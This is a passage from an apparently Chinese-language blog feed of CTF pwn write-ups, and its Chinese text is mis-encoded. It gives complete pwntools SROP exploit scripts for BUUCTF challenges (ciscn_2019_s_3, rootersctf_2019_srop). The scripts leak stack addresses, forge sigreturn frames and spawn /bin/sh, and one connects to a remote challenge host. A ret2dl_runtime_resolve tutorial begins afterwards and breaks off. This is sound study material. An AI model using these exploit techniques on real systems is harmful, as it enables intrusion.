src="/../img/2706180-20220220190338842-381275045.png"></p><p>è¿™é“é¢˜åœ¨ä¸»å‡½æ•°é‡Œåªæœ‰ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸è¿‡å‘ç°è¿™ä¸ªwriteç³»ç»Ÿè°ƒç”¨æ—¶æœ‰æ¼æ´çš„ï¼Œå®ƒå¯ä»¥æ‰“å°0x30ä¸ªæ•°æ®ï¼Œå¯æ˜¯å¯ä»¥çœ‹å‡ºæ¥bufè·ç¦»æ ˆåº•ä»…ä»…åªæœ‰0x10å­—èŠ‚</p><p><img src="/../img/2706180-20220220190344777-904593431.png"></p><p>è¿™å°±æ„å‘³ç€writeæ˜¯å¯ä»¥å»æ³„éœ²æ ˆä¸­æ•°æ®çš„ï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥é…åˆç³»ç»Ÿè°ƒç”¨readæ¥æŠŠ&#x2F;bin&#x2F;shå†™å…¥æ ˆé‡Œé¢ï¼ŒåŒæ—¶é‡Œé¢åç§»åŠ ä¸Šæ³„éœ²çš„æ ˆåœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡º&#x2F;bin&#x2F;shçš„åœ°å€ã€‚ï¼ˆè¿™ä¸ª&#x2F;bin&#x2F;shåç§»çš„è®¡ç®—åœ¨ret2csuä¸­å·²ç»æè¿‡äº†ï¼Œè¿™é‡Œå°±ä¸åœ¨èµ˜è¿°ï¼‰</p><p>ç„¶åæˆ‘ä»¬è¿˜å‘ç°äº†ç³»ç»Ÿè°ƒç”¨sigreturn</p><p><img src="/../img/2706180-20220220190351016-2105082674.png"></p><p>è¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å»å®ç°SROPäº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">mov_rax_15=<span class="number">0x4004DA</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)<span class="comment">#è¿™æ¬¡å‘é€çš„ç›®çš„å°±æ˜¯è·å–/bin/shçš„åœ°å€</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>)<span class="comment">#é™åˆ¶ä¸€ä¸‹æ¡ä»¶ï¼Œç¡®ä¿æ¥æ”¶çš„æ˜¯æˆ‘ä»¬è¦æ³„éœ²çš„åœ°å€</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span><span class="comment">#è¿™ä¸ªåç§»åœ¨ret2csuä¸­è®¡ç®—å‡ºæ¥äº†ï¼Œè¿™é‡Œä¸å†é‡å¤æäº†</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">frame=SigreturnFrame()<span class="comment">#æ¥ä¸‹æ¥å¼€å§‹è®¾ç½®å‚æ•°</span></span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=bin_sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(mov_rax_15)+p64(syscall_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#è¿™æ¬¡payloadçš„ç›®çš„æ˜¯æŠŠ/bin/shå­˜åˆ°æ ˆé‡Œï¼Œå¹¶ä¸”ä¼ªé€ ä¸€ä¸ªSignal Frame</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BUUCTF-ciscn-2019-s-3"><a href="#BUUCTF-ciscn-2019-s-3" class="headerlink" title="BUUCTF_ciscn_2019_s_3"></a>BUUCTF_ciscn_2019_s_3</h2><p><img src="/../img/2706180-20220222104440708-175917302.png"></p><p><img src="/../img/2706180-20220222104446654-1916710342.png"></p><p>è¿™å·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œè¦ç”¨SROPã€‚</p><p>å…ˆå»æŠŠæ ˆåœ°å€æ³„éœ²ä¸€ä¸‹ã€‚</p><p>ç¬¬ä¸€æ¬¡éšä¾¿è¾“å…¥ï¼ˆä¸è¿‡æœ€åè¦åœ¨è¿”å›åœ°å€ä¸Šå†™ä¸€ä¸ªvulçš„é¦–åœ°å€ï¼Œé‡æ–°è¿›è¡Œreadï¼‰</p><p>ç¬¬ä¸€æ¬¡èµ°vulå°±æ˜¯ä¸ºäº†writeæ³„éœ²åœ°å€</p><p><img src="/../img/2706180-20220222104450476-1019432047.png"></p><p>æˆ‘ä»¬è¦æ³„éœ²è·ç¦»æ ˆé¡¶ç¬¬ä¸‰ä¸ªçš„å†…å®¹ï¼Œå› ä¸ºå®ƒæŒ‡å‘äº†æ ˆåœ°å€</p><p><img src="/../img/2706180-20220222104454166-166128671.png"></p><p>ç„¶åå‘ç°è¿™ä¸ªåœ°å€æ˜¯åœ¨32å­—èŠ‚å¤„è¢«æ¥æ”¶çš„</p><p>ç»è¿‡è§‚å¯Ÿreadå‡½æ•°ï¼Œå‘ç°æˆ‘ä»¬payloadä»0x7fffffffdf70å¼€å§‹å­˜å‚¨ï¼Œçœ‹ä¸€ä¸‹æ³„éœ²çš„æ ˆåœ°å€è·ç¦»è¿™ä¸ªdf70çš„åç§»</p><p><img src="/../img/2706180-20220222104457644-721340483.png"></p><p>åç§»æ‹¿åˆ°ï¼Œç„¶åå°±ç›´æ¥æ„é€ sropçš„é‚£ä¸ªpayloadå³å¯ï¼Œæˆ‘ä»¬è¦ä¿è¯&#x2F;bin&#x2F;shåœ¨df70è¿™ä¸ªåœ°å€ï¼Œç„¶åç»è¿‡è°ƒè¯•å‘ç°è¿™é‡Œæ˜¯è¦å¡«å……16ä¸ªå­—èŠ‚æ‰èƒ½åˆ°è¿”å›åœ°å€çš„ï¼Œå› æ­¤æˆ‘å°±å¡«äº†ä¸¤ä¸ª&#x2F;bin&#x2F;sh\x00ï¼Œç¬¬äºŒæ¬¡å¡«å……åˆ«çš„ä¹Ÿè¡Œï¼Œåæ­£è¦å‡‘é½åå…­ä¸ªå­—èŠ‚</p><p>Expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=kong</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(modify_rax)+p64(syscall_ret_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å…¶å®æ”¶è·æœ€å¤§çš„å¹¶ä¸æ˜¯è¿™ä¸ªæ­£ç¡®çš„exp</p><p>è€Œæ˜¯ä¸‹é¢è¿™ä¸ªé”™è¯¯çš„exp(è¿™ä¸ªexpè„šæœ¬ç›´æ¥è¿è¡Œçš„è¯ï¼Œæ˜¯æ‹¿ä¸åˆ°shellçš„ï¼Œä½†æ˜¯å¦‚æœç”¨gdbé™„åŠ è¿›ç¨‹è°ƒè¯•çš„è¯ï¼Œæ˜¯å¯ä»¥æ‹¿åˆ°shellçš„ï¼Œå› æ­¤è¿™ä¸ªexpæ˜¯éå¸¸å¥‡æ€ªçš„ï¼Œä½†å®ƒç¡®å®æ˜¯é”™çš„ï¼Œåªä¸è¿‡å› ä¸ºå·§åˆåœ¨è°ƒè¯•çš„æƒ…å†µä¸‹ï¼Œæ˜¯æ­£ç¡®çš„)</p><p>å¯ä»¥å‘ç°è¿™ä¸ªexpå‘é€äº†ä¸‰æ¬¡payload</p><p>ç¬¬ä¸‰æ¬¡å’Œç¬¬äºŒæ¬¡payloadå°±æ˜¯åœ¨å¸ƒç½®å‡†å¤‡æ‰§è¡Œsropçš„æ¡ä»¶</p><p>å½“æ—¶ç”¨gdbè°ƒè¯•èµ°åˆ°æœ€åå‘ç°å°±å¯ä»¥è·å–shell</p><p>ä½†æ˜¯å¦‚æœç›´æ¥è¿è¡Œè¿™ä¸ªè„šæœ¬å°±ä¸èƒ½è·å–shell</p><p>å¡äº†å¾ˆä¹…å¾ˆä¹…ï¼Œæœ€åè¯·æ•™äº†roderickå¸ˆå‚…ï¼Œæœ€åè±ç„¶å¼€æœ—ï¼Œè§£é‡Šå¦‚ä¸‹ã€‚</p><p><strong>åœ¨æŒ‚gdbçš„æ—¶å€™ ç¬¬äºŒæ¬¡çš„readè¿˜æ²¡æœ‰æ‰§è¡Œï¼Œä½†æ˜¯å†…æ ¸ç¼“å†²åŒºçš„æ•°æ®å·²ç»æ‹·è´åˆ°äº†ç”¨æˆ·æ•°æ® æ„æ€å°±æ˜¯è¯´ æˆ‘çš„ç¬¬äºŒæ¬¡payloadå’Œç¬¬ä¸‰æ¬¡çš„payloadç°åœ¨éƒ½å­˜åˆ°äº†ç¼“å†²åŒºé‡Œé¢ gdbè°ƒè¯•åˆ°äº†ç¬¬äºŒä¸ªreadï¼Œç›´æ¥å°±æŠŠä¸¤æ¬¡çš„payload éƒ½ç»™è¯»è¿›å»äº†ï¼ˆæˆ‘åˆçœ‹äº†ä¸‹è°ƒè¯•å‘ç°å´æ˜¯æ˜¯è¿™æ ·ï¼‰ ç„¶åè¿™ä¸¤æ¬¡çš„å†…å®¹åœ¨ä¸€æ¬¡é‡Œé¢ä¿®æ”¹äº†æ ˆç©ºé—´æ°å¥½å°±æ˜¯å¯¹çš„äº† ä½†æ˜¯æˆ‘ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œè¿˜æ˜¯å‘äº†ä¸‰æ¬¡çš„payload</strong></p><hr><p> <strong>ç®€å•æ¥è¯´å°±æ˜¯å°±æ˜¯å…¶å®æˆ‘ç°åœ¨ç”¨gdbçœ‹çš„æ˜¯ä¸€ç§å‡è±¡ï¼Œgdbç°åœ¨è°ƒè¯•è®©æˆ‘çœ‹åˆ°çš„ æ˜¯ä¸€æ¬¡æ€§å‘é€äº†ä¸¤ä¸ªpayloadçš„æƒ…å†µï¼Œä½†äº‹å®ä¸Šæˆ‘ç¨‹åºæœ¬èº«è¿è¡Œçš„æ—¶å€™ å¹¶ä¸æ˜¯æˆ‘ç°åœ¨gdbçœ‹åˆ°çš„æƒ…å†µ</strong>** </p><p> <font color=red><strong>ä»¥åè¿™é‡Œå°±è¦æ³¨æ„äº†ï¼Œå¦‚æœæ˜¯å¤šä¸ªreadçš„æƒ…å†µï¼Œä½¿ç”¨gdbè°ƒè¯•çš„æ—¶å€™è¦æ³¨æ„ï¼Œé¿å…ä¸€æ¬¡readç»™è¯»è¿›å»ä¸¤æ¬¡payloadã€‚</strong></font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(vul_addr)+p64(modify_rax)+p64(syscall_ret_addr)<span class="comment">#æ ¸å¿ƒé—®é¢˜æ˜¯åœ¨è¿™é‡Œï¼Œæ­¤æ—¶çš„returnç›´æ¥è¿”å›åˆ°äº†modify_raxè¿™ä¸ªåœ°å€ï¼Œæ²¡æœ‰åˆ°vul_addrè¿™ä¸ªåœ°å€ï¼Œå› æ­¤ç¨‹åºå…¶å®å¹¶æ²¡æœ‰æ‰§è¡Œç¬¬ä¸‰æ¬¡çš„è¾“å…¥ã€‚</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a>rootersctf_2019_srop</h2><p><img src="/../img/image-20221007110823863.png" alt="image-20221007110823863"></p><p>å‘ç°è¿™é‡Œå°±ä¸€ä¸ªè¾“å…¥å’Œè¾“å‡ºçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå‘ç°æ— è®ºå¦‚ä½•ä¹Ÿæ— æ³•æ³„éœ²æ ˆåœ°å€ï¼Œå› æ­¤&#x2F;bin&#x2F;shç›´æ¥å†™å…¥æ ˆé‡Œçš„è¯æˆ‘ä»¬æ˜¯ä¸çŸ¥é“åœ°å€çš„ã€‚æ‰€ä»¥é‡‡ç”¨sropä¼ªé€ ä¸¤æ¬¡ä¸Šä¸‹æ–‡ï¼Œç¬¬ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨readå°†&#x2F;bin&#x2F;shä»¥åŠç¬¬äºŒæ¬¡ä¼ªé€ çš„ä¸Šä¸‹æ–‡éƒ½å†™å…¥dataæ®µ(dataæ®µåœ°å€æ˜¯å›ºå®šä¸å˜çš„)ï¼Œç„¶åè¿ç§»åˆ°dataæ®µï¼Œè¿›è¡Œç¬¬äºŒæ¬¡sropã€‚</p><p>è¿™é“é¢˜æ§åˆ¶ç¬¬ä¸€æ¬¡ripçš„gadgetä¸ºsyscall;leave;ret,è€Œleaveå’ŒretæŒ‡ä»¤ç›¸å½“äºmov rbp,rsp;pop rbp;pop  ripï¼Œè°ƒè¯•ä¸€ä¸‹å°±å‘ç°æˆ‘ä»¬æ§åˆ¶rspæ²¡ç”¨ï¼Œè¦å»æ§åˆ¶rbpï¼Œåœ¨æ‰§è¡Œleave;retçš„æ—¶å€™åˆå°†rbpç»™äº†rspï¼Œå› æ­¤ç¬¬ä¸€æ¬¡å¸ƒç½®çš„å¯„å­˜å™¨çš„å€¼ä¸­åªéœ€æ§åˆ¶rbpå³å¯ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29672</span>)</span><br><span class="line">syscall_addr=<span class="number">0x0000000000401033</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401032</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0x402000</span></span><br><span class="line">frame.rdx=<span class="number">0x1000</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">frame.rbp=<span class="number">0x402000</span>-<span class="number">8</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=<span class="number">0x402108</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007110808668.png" alt="image-20221007110808668"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºret2_dl_runtime_resolveçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/ba418f23.html"/>
      <url>/posts/ba418f23.html</url>
      
        <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« ä¹Ÿç®—æ˜¯é›†ç™¾å®¶ä¹‹é•¿äº†ï¼Œå› ä¸ºåœ¨å­¦ä¹ ret2dlresolveè¿™ä¸ªé«˜çº§ropçš„æ—¶å€™ï¼Œå¸ˆå‚…ä»¬å¯èƒ½éƒ½æ˜¯å› ä¸ºå®åŠ›æ¯”è¾ƒå¼ºï¼Œå› è€Œåœ¨ä¸€äº›ç»†èŠ‚çš„åœ°æ–¹æ²¡æœ‰è§£é‡Šä¸ºä»€ä¹ˆï¼Œå¦‚æ­¤åœ¨å­¦ä¹ çš„æ—¶å€™ï¼Œè¿˜æ˜¯ç¨å¾®æœ‰ç‚¹åƒåŠ›çš„ï¼Œå­¦ä¹ äº†å¾ˆå¤šä½å¸ˆå‚…çš„åšå®¢ä¹‹ååŠ ä¸Šè‡ªå·±çš„ä¸€äº›æ€è€ƒæ‰å†™å‡ºäº†è¿™ç¯‡åšå®¢ï¼ˆæˆ‘è®¤ä¸ºå†™çš„æ¯”è¾ƒå¥½çš„åšå®¢é“¾æ¥éƒ½æ”¾åˆ°æ–‡ç« æœ€åäº†ï¼Œæˆ‘æœ‰çš„å°ç»†èŠ‚å¯èƒ½å¿˜è®°æåˆ°äº†ï¼Œå¯ä»¥å»è¿™äº›å¸ˆå‚…çš„åšå®¢ä¸Šé¢çœ‹ä¸€ä¸‹ï¼‰ï¼Œä¹Ÿç®—æ˜¯ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šå­¦ä¹ äº†ã€‚</p><p>åœ¨å­¦ä¹ ret2dlresolveçš„æ—¶å€™ï¼Œæˆ‘å»ºè®®å…ˆæŠŠ_dl_runtime_resolveå‡½æ•°çš„è¿ä½œæµç¨‹æé€å½»äº†å†å»åšé¢˜ï¼Œæ•ˆæœä¼šå¥½å¾ˆå¤šï¼Œä¸ç„¶ç›´æ¥ä¸Šé¢˜çš„è¯ï¼Œæ ¹æœ¬å°±ä¸æ‡‚åŸç†æ˜¯æ€ä¹ˆæçš„ã€‚</p><p>éœ€è¦çš„å‰ç½®çŸ¥è¯†ï¼š1ã€å¯¹å»¶è¿Ÿç»‘å®šæœºåˆ¶çš„æ•´ä½“æµç¨‹è¾ƒä¸ºç†Ÿæ‚‰  2ã€å¯¹æ ˆè¿ç§»çš„çŸ¥è¯†è¦æ¯”è¾ƒç†Ÿæ‚‰  3ã€åšé¢˜çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šé‡è§å¾ˆå¤šå°ç»†èŠ‚é—®é¢˜ï¼Œå› æ­¤è¦å…·å¤‡gdbè°ƒè¯•èƒ½åŠ›  4ã€å¦‚æœå¯ä»¥çš„è¯ï¼Œæœ€å¥½å‚è€ƒç€glibcæºç ä¸€èµ·å­¦ä¹ è¿™éƒ¨åˆ†å†…å®¹ï¼ˆå°±æ˜¯é‡è§ä¸ä¼šçš„é—®é¢˜ï¼Œå¯ä»¥ä»æºç ä¸Šä¸‹æ‰‹è¯•è¯•ï¼‰ï¼Œå°½ç®¡æˆ‘å·²ç»å‡ºç¤ºäº†ç”¨åˆ°çš„ç»“æ„çš„æºç ï¼Œä½†æˆ‘å»ºè®®æœ€å¥½ä½ çš„æ‰‹é‡Œä¹Ÿæœ‰ä¸€ä»½glibcæºç   5ã€ç”±äºåˆšå¼€å§‹ç†è§£ä¼šå¼‚å¸¸çš„è´¹åŠ²ï¼Œå¯èƒ½ä¼šéœ€è¦å‡ å¤©æ‰èƒ½ç†è§£é€å½»ï¼Œæ‰€ä»¥å­¦ä¹ è¿™éƒ¨åˆ†çš„å†…å®¹è¿˜éœ€è¦æœ‰ä¸€ä»½è€å¿ƒ</p><h1 id="å»¶è¿Ÿç»‘å®šæ•´ä½“æµç¨‹å›¾"><a href="#å»¶è¿Ÿç»‘å®šæ•´ä½“æµç¨‹å›¾" class="headerlink" title="å»¶è¿Ÿç»‘å®šæ•´ä½“æµç¨‹å›¾"></a>å»¶è¿Ÿç»‘å®šæ•´ä½“æµç¨‹å›¾</h1><p>ä¸‹é¢æˆ‘ä¸»è¦è§£é‡Š_dl_runtime_resolveè¿™ä¸ªå‡½æ•°è¿ä½œæ—¶çš„æƒ…å†µï¼Œè€Œå»¶è¿Ÿç»‘å®šçš„æ•´ä½“æµç¨‹æˆ‘å°±ä¸è¯¦ç»†è¯´æ˜äº†ï¼Œå…·ä½“çš„æµç¨‹å¯ä»¥å‚è€ƒä¸‹é¢è¿™ä¸ªæµç¨‹å›¾ï¼ˆè¿™ä¸ªæˆ‘ä¹Ÿå¿˜è®°æ˜¯å“ªä¸ªå¸ˆå‚…åšçš„äº†ï¼Œå¾ˆä¹…ä¹‹å‰æ”¶è—äº†è¿™ä¸ªå›¾ç‰‡ï¼‰</p><p><img src="/../img/2706180-20220228094538432-2125281617.png"></p><p>è€ŒLinuxä¸­æœ€ç»ˆå®ŒæˆåŠ¨æ€é“¾æ¥çš„å‡½æ•°è¿›è¡Œé‡å®šä½çš„æ˜¯åœ¨_dl_runtime_resolve(link_map_obj, reloc_index)å‡½æ•°ä¸­å®Œæˆçš„ï¼Œå¦‚æœå†è¯¦ç»†ä¸€ç‚¹å°±æ˜¯_dl_runtime_resloveå‡½æ•°è°ƒç”¨äº†_dl_fixupå‡½æ•°ï¼Œç„¶å_dl_fixupå‡½æ•°è°ƒç”¨äº†_dl_lookup_symbol_xå‡½æ•°ï¼Œæœ€ç»ˆè¿™ä¸ªå‡½æ•°å»åŠ¨æ€åº“é‡Œé¢æ‰¾åˆ°äº†æˆ‘ä»¬æ­¤åˆ»è¿›è¡Œå»¶è¿Ÿç»‘å®šçš„å‡½æ•°ï¼Œå¹¶ä¸”æŠŠå®ƒçš„åœ°å€å¡«å†™åˆ°äº†got.pltè¡¨é¡¹ä¸­ã€‚è¿™é‡Œä¸»è¦è¯¦ç»†è®²ä¸€ä¸‹_dl_runtime_resolveå‡½æ•°çš„è¿ä½œæµç¨‹</p><h1 id="dl-runtime-resloveå‡½æ•°çš„è¿ä½œæµç¨‹"><a href="#dl-runtime-resloveå‡½æ•°çš„è¿ä½œæµç¨‹" class="headerlink" title="_dl_runtime_resloveå‡½æ•°çš„è¿ä½œæµç¨‹"></a>_dl_runtime_resloveå‡½æ•°çš„è¿ä½œæµç¨‹</h1><p>è¿™ä¸ªå‡½æ•°è¿è¡Œçš„å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼Œ<strong>æµç¨‹ä¸ç†è§£ä¹Ÿæ²¡å…³ç³»ï¼Œå…ˆç»“åˆç€æˆ‘å†™çš„æµç¨‹è·Ÿç€ä¸€èµ·åšå°±å¯ä»¥äº†</strong>ï¼Œåšå®Œä¹‹åè‚¯å®šå°±ä¼šæœ‰ç‚¹æ€è·¯äº†ï¼Œè¿™æ—¶å€™å°±å¯ä»¥è¿›è¡Œä¸€äº›æ€è€ƒäº†ã€‚<strong>ä¸‹é¢è¿™ä¸‰ä¸ªæ®µ</strong>ï¼Œæˆ‘å»ºè®®å…ˆå¤§æ¦‚çœ‹ä¸€ä¸‹ï¼Œ<strong>ä¸ç”¨å½»åº•å¼„æ‡‚</strong>ï¼Œç„¶åå¼€å§‹è·Ÿç€æˆ‘çš„æµç¨‹åˆ†æï¼Œ<strong>ç­‰é‡åˆ°è¿™ä¸ªæ®µçš„æ—¶å€™ï¼Œå†æ‹å›æ¥çœ‹ï¼Œæ•ˆæœä¼šæ¯”è¾ƒå¥½ã€‚</strong></p><h3 id="dynamicæ®µ"><a href="#dynamicæ®µ" class="headerlink" title=".dynamicæ®µ"></a>.dynamicæ®µ</h3><p><u>.dynamicæ®µé‡Œé¢ä¿å­˜äº†åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€è¦çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¯”å¦‚ä¾èµ–äºå“ªäº›å…±äº«å¯¹è±¡ï¼ŒåŠ¨æ€é“¾æ¥ç¬¦å·è¡¨çš„ä½ç½®ï¼ˆDynamic Symbol Table)ã€åŠ¨æ€é“¾æ¥é‡å®šä½è¡¨çš„ä½ç½®ã€åŠ¨æ€é“¾æ¥å­—ç¬¦ä¸²è¡¨çš„ä½ç½®(Dynamic String Table)</u>ã€‚ä¹Ÿå°±æ˜¯è¯´<strong>æ¯”å¦‚ç°åœ¨æƒ³æ‰¾åˆ°Dynamic Symbol Tableï¼Œå°±å¿…é¡»å…ˆæ‰¾åˆ°.dynamicçš„åœ°å€ï¼Œæ‰å¯ä»¥å»æ‰¾åˆ°Dynamic Symbol Tableï¼Œå› æ­¤è¿™ä¸ªæ®µä¸»è¦ç”¨äºå¯»æ‰¾ä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„å…¶ä»–æ®µ( .dynsym .dynstr .rela.plt 